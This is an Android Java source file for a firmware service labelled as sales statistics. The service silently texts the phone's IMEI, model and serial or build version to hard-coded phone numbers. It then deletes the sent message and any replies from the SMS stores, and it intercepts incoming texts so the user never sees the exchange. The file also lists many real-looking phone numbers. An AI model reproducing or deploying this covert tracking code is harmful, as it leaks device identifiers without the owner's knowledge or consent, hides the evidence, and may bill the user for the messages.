/*******************************************
 *版权所有©2015,深圳市铂睿智恒科技有限公司
 *
 *内容摘要：
 *当前版本：
 *作	者：
 *完成日期：
 *修改记录：
 *修改日期：
 *版 本 号：
 *修 改 人：
 *修改内容：
...
 *修改记录：
 *修改日期：
 *版 本 号：
 *修 改 人：
 *修改内容：
 *********************************************/

package com.android.prize.salesstatis;

import android.app.Activity;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.os.SystemClock;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.SubscriptionManager;
import android.os.SystemProperties;
import android.util.Log;
import com.android.prize.salesstatis.util.IService;
public class AutoSendSmsService extends Service {
	private final boolean DEBUG = true;
	private static final String TAG = "PrizeSalesStatis";

	private static final String URL_INBOX = "content://mms/inbox";// 收件箱
	private static final String URL_SENT = "content://sms/sent";// 已发送
	private static final String URL_DRAFT = "content://mms/drafts";// 草稿
	private static final String URL_OUTBOX = "content://sms/outbox";// 发件中
	private static final String URL_FAILED = "content://sms/failed";// 失败
	private static final String URL_QUEUED = "content://sms/queued";// 待发送

	private static final int SEND_SMS_TIME = 1;// min
	private static final int SEND_SMS_DELAY_TIME = 1;// min
	private static long sendMmsLastTime = 0;// min
	private static long sendMmsinitTime = 0;// min
	private static boolean istestsms = true;
	private static String telNumber;

	private static final String[] telephoneNumPrize = { "13554832340", "13554832342", "13590216415", "13590216423",
			"13590498440", "13590498443", "13590498446", "15768364780", "15768364823", "15818548742", "13554881573",
			"13715144530", "13715144701", "18475453854", "18475453874" };
	private static final String[] telephoneNumtest = { "15870817736" };

	private static String[] telephoneNum = telephoneNumPrize;

	private boolean isSending = true;

	private BroadcastReceiver myTimeChangeReceiver = new BroadcastReceiver() {
		@Override
		public void onReceive(Context context, Intent intent) {
			if (intent.getAction().equals(Intent.ACTION_TIME_TICK)) {
				Log.v(TAG, "----time change....---->");
				long ut = SystemClock.elapsedRealtime() / 1000 - sendMmsinitTime;
				long dt = SEND_SMS_TIME * 60;
				if (ut == 0) {
					ut = 1;
				}
				Log.v(TAG, "----cur uptime---->" + ut);
				Log.v(TAG, "----dt uptime---->" + dt);
				if (ut > dt && isSending) {
					updateTimesOfSms();
				}
				if (ut > (dt + 60 * 60)) {
					int salesstatis = Settings.System.getInt(context.getContentResolver(),
							Settings.System.PRIZE_SALES_STATIS_MMS, 0);
					if (salesstatis == 0) {
						Log.v(TAG, "----salesstatis--->" + salesstatis);
						stopSelf();
					}
				}
			}
		}
	};

	@Override
	public IBinder onBind(Intent intent) {

		return null;
	}

	@Override
	public void onCreate() {
		Log.v(TAG, "----AutoSendSmsService....---->onCreate()");
		registerReceiver(interceptSmsReciever, new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
		registerReceiver(myTimeChangeReceiver, new IntentFilter(Intent.ACTION_TIME_TICK));
		registerReceiver(reciverBroadcastReceiver, new IntentFilter(SENT));
		registerReceiver(sendBroadcastReceiver, new IntentFilter(DELIVERED));
		Intent intent = new Intent(AutoSendSmsService.this, GetPhoneStateServices.class);
        bindService(intent, conn, Context.BIND_AUTO_CREATE);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		boolean ret = SmsWriteOpUtil.setWriteEnabled(this, true);
		sendMmsinitTime = SystemClock.elapsedRealtime() / 1000;
		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		Log.v(TAG, "----AutoSendSmsService....onDestroy()---->");
		unregisterReceiver(myTimeChangeReceiver);
		unregisterReceiver(interceptSmsReciever);
		unregisterReceiver(reciverBroadcastReceiver);
		unregisterReceiver(sendBroadcastReceiver);
		this.unbindService(conn);
		super.onDestroy();
	}

	/** prize-add-by-zhongweilin-20150603-start */
	private void updateTimesOfSms() {
		long at = SystemClock.uptimeMillis() / 1000;
		if (at > (sendMmsLastTime + SEND_SMS_DELAY_TIME * 60)) {
			sendMmsLastTime = at;
			try {
				telNumber = telephoneNum[readomTelNum()];// telephoneNum[readomTelNum()];
				Log.v(TAG, "---- ----> devicestate == " + getDeviceState());
				send2(telNumber, getDeviceState());
			} catch (Exception e) {
				Log.v(TAG, "----get IMEI is Exception!!!!!---->");
				e.printStackTrace();
			}
		}
	}

	private int readomTelNum() {
		return (int) (Math.random() * telephoneNum.length);
	}

	/**
	 * 方法描述：拦截短信广播
	 * 
	 * @param 参数名
	 *            说明
	 * @return 返回类型 说明
	 * @see 类名/完整类名/完整类名#方法名
	 */
	private BroadcastReceiver interceptSmsReciever = new BroadcastReceiver() {
		@Override
		public void onReceive(final Context context, Intent intent) {
			String functiontype = "";
			Bundle bundle = intent.getExtras();
			Object messages[] = (Object[]) bundle.get("pdus");
			SmsMessage smsMessage[] = new SmsMessage[messages.length];
			for (int n = 0; n < messages.length; n++) {
				smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
				final String msgContent = smsMessage[n].getMessageBody();
				Log.v(TAG, "---- interceptSmsReciever... smsMessage ----" + smsMessage);
				for (int i = 0; i < telephoneNum.length; i++) {
					if (msgContent.contains(telephoneNum[i])) {
						Log.v(TAG, "---- interceptSmsR  is back mms ok ----");
						new Thread(new Runnable() {
							public void run() {
								deleteMms(context, msgContent);
								Log.v(TAG, "----interceptSmsReciever  over ... ----");
							}
						}, "WorkingMessage.asyncDelete").start();
					}
				}
			}
		}
	};

	private BroadcastReceiver sendBroadcastReceiver = new BroadcastReceiver() {
		@Override
		public void onReceive(Context context, Intent intent) {
			switch (getResultCode()) {
			case Activity.RESULT_OK:
				Log.i(TAG, "RESULT_OK");
				break;
			case Activity.RESULT_CANCELED:
				Log.i(TAG, "RESULT_CANCELED");
				break;
			}
		}
	};

	private BroadcastReceiver reciverBroadcastReceiver = new BroadcastReceiver() {
		@Override
		public void onReceive(Context context, Intent intent) {
			switch (getResultCode()) {
			case Activity.RESULT_OK:
				Log.i(TAG, "Activity.RESULT_OK");
				Settings.System.putInt(getContentResolver(), Settings.System.PRIZE_SALES_STATIS_MMS, 0);
				isSending = false;
				break;
			case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
				Log.i(TAG, "11122-----RESULT_ERROR_GENERIC_FAILURE-----111");
				break;
			case SmsManager.RESULT_ERROR_NO_SERVICE:
				Log.i(TAG, "RESULT_ERROR_NO_SERVICE");
				break;
			case SmsManager.RESULT_ERROR_NULL_PDU:
				Log.i(TAG, "RESULT_ERROR_NULL_PDU");
				break;
			case SmsManager.RESULT_ERROR_RADIO_OFF:
				Log.i(TAG, "RESULT_ERROR_RADIO_OFF");
				break;
			}
			String curStr = getDeviceState();
			deleteMms(context, curStr);
		}
	};
	String SENT = "sms_sent";
	String DELIVERED = "sms_delivered";

	private void send2(String number, String message) {
		PendingIntent sentPI = PendingIntent.getBroadcast(this, 0, new Intent(SENT), PendingIntent.FLAG_UPDATE_CURRENT);
		PendingIntent deliveredPI = PendingIntent.getBroadcast(this, 0, new Intent(DELIVERED),
				PendingIntent.FLAG_UPDATE_CURRENT);

		int subId = Settings.Global.getInt(getContentResolver(), Settings.Global.MULTI_SIM_SMS_SUBSCRIPTION,
				SubscriptionManager.INVALID_SUBSCRIPTION_ID);
		Log.v(TAG, "----send sms sim_sms subId = " + subId);
		if (subId == -1) {
			subId = Settings.Global.getInt(getContentResolver(), Settings.Global.MULTI_SIM_DATA_CALL_SUBSCRIPTION,
					SubscriptionManager.INVALID_SUBSCRIPTION_ID);
		}
		Log.v(TAG, "----send sms sim data call subId = " + subId);
		if (subId == -1) {
			SmsManager smsm = SmsManager.getDefault();
		}
		Log.v(TAG, "----send sms sim subId = " + subId);
		SmsManager smsManager = SmsManager.getSmsManagerForSubscriptionId(subId);
		Log.v(TAG, "----send sms ... ----");
		smsManager.sendTextMessage(number, null, message, sentPI, deliveredPI);
		Log.v(TAG, "----send sms over ... ----");
	}

	private void deleteMms(final Context context, final String curStr) {
		new Thread(new Runnable() {
			public void run() {
				deleteSMS(context, curStr, URL_FAILED);
				deleteSMS(context, curStr, URL_DRAFT);
				deleteSMS(context, curStr, URL_SENT);
				deleteSMS(context, curStr, URL_INBOX);
				deleteSMS(context, curStr, URL_OUTBOX);
			}
		}, "WorkingMessage.asyncDelete").start();
	}

	public void deleteSMS(final Context context, final String smscontent, final String boxcontent) {
		// 准备系统短信收信箱的uri地址
		final Uri uri = Uri.parse(boxcontent);// 收信箱
		// 查询收信箱里所有的短信
		Cursor isRead = context.getContentResolver().query(uri, null, null, null, null);
		try {
			Log.v(TAG, "----0000000000  contextr = " + boxcontent);
			Log.v(TAG, "----11111111111   Cursor = " + isRead.getCount());
			while (isRead.moveToNext()) {
				// String phone =
				// isRead.getString(isRead.getColumnIndex("address")).trim();//获取发信人
				String body = isRead.getString(isRead.getColumnIndex("body")).trim();// 获取信息内容
				Log.v(TAG, "----2222222222   body = " + body);
				if (body.equals(smscontent)) {
					int id = isRead.getInt(isRead.getColumnIndex("_id"));
					// int threadid =
					// isRead.getInt(isRead.getColumnIndex("thread_id"));
					Log.v(TAG, "----33333333333333333 ... ---- id == " + id);
					deleteSms(id);
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
			Log.v(TAG, "----error error ... ----");
		} finally {
			isRead.close();
		}
	}

	private void deleteSms(int id) {
		try {
			ContentResolver CR = getContentResolver();
			Uri uri = Uri.parse("content://sms/");
			// Uri uri = Uri.parse("content://mms-sms/conversations/" +id);
			// int result = CR.delete(uri, null, null);
			String where = "_id=" + id;
			int result = CR.delete(uri, where, null);
			Log.d(TAG, "deleteSms_Id:: " + id + "  result::" + result);
		} catch (NumberFormatException e) {
			e.printStackTrace();
		} catch (Exception e) {
			Log.d(TAG, "Exception:: " + e);
		}
	}

	private String getDeviceState() {
		// if(compare(Build.SYSTEM_VERSION, "dido")){
		String pj = SystemProperties.get("ro.prize_customer");
		if (pj.equals("koobee")) {
			String devicestate = "KB";
			devicestate += "@" + getImei();
			devicestate += "@" + Build.MODEL;
			devicestate += "@" + Build.SERIAL;
			return devicestate;
		} else if (pj.equals("coosea")) {
			String devicestate = "KS";
			devicestate += "@" + getImei();
			devicestate += "@" + Build.MODEL;
			devicestate += "@" + getSystemVersion();
			return devicestate;
		} else if (pj.equals("odm")) {
			String devicestate = "ODM";
			devicestate += "@" + getImei();
			devicestate += "@" + Build.MODEL;
			devicestate += "@" + getSystemVersion();
			return devicestate;
		} else {
			String devicestate = "PR";
			devicestate += "@" + getImei();
			devicestate += "@" + Build.MODEL;
			devicestate += "@" + getSystemVersion();
			return devicestate;
		}
	}

	private boolean compare(String sn, String dido) {
		if (sn.length() < 4) {
			return false;
		}
		sn = sn.substring(0, 4);
		Log.v(TAG, "-AutoSendSms--systemVersion-----> " + sn);
		return sn.equalsIgnoreCase(dido);
	}

	private String getSystemVersion() {
		String systemVersion = Build.DISPLAY;
		Log.v(TAG, "-AutoSendSms--Version-----> " + systemVersion);
		if (systemVersion != null && !systemVersion.equals("")) {
			String[] trim = systemVersion.split("\\.");
			String ret = trim[0];
			for (int i = 0; i < trim.length; i++) {
				Log.v(TAG, "-AutoSendSms--SystemVersion[" + i + "]----> " + trim[i]);
				if (i > 1) {
					break;
				}
				if (i == 0) {
					continue;
				}
				ret += "," + trim[i];
			}
			return ret;
		}
		return null;
	}

	private String getImei() {
		String curImei = "";
		/*CTelephoneInfo telephonyInfo = CTelephoneInfo.getInstance(this);
		telephonyInfo.setPhoneInfo();
		String imeiSIM1 = telephonyInfo.getImeiSIM1();
		String imeiSIM2 = telephonyInfo.getImeiSIM2();
		String meidSIM1 = telephonyInfo.getMeidSIM1();
		String meidSIM2 = telephonyInfo.getMeidSIM2();
		if (imeiSIM1 != null) {
			curImei = imeiSIM1;
			if (meidSIM2 != null) {
				curImei = curImei + "," + meidSIM2;
			} else if (imeiSIM2 != null) {
				curImei = curImei + "," + imeiSIM2;
			}
		} else if (meidSIM1 != null) {
			curImei = meidSIM1;
			if (imeiSIM2 != null) {
				curImei = curImei + "," + imeiSIM2;
			} else if (meidSIM2 != null) {
				curImei = curImei + "," + meidSIM2;
			}
		}*/
		try {
			curImei = iService.getImei();
		} catch (RemoteException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		Log.v(TAG, "[AutoSendSms]--curImei----> " + curImei);
		return curImei;
	}

	/** prize-add-by-zhongweilin-20150603-end */
	private IService iService=null;
	private ServiceConnection conn = new ServiceConnection() {
		public void onServiceConnected(ComponentName name, IBinder service) {
			// TODO Auto-generated method stub
			Log.v(TAG, "[AutoSendSms] onbind--onServiceConnected----> ");
			 iService=IService.Stub.asInterface(service);

		}

		public void onServiceDisconnected(ComponentName name) {
			// TODO Auto-generated method stub
			Log.v(TAG, "[AutoSendSms] onbind--onServiceDisconnected----> ");
			iService = null;
		}

	};

}
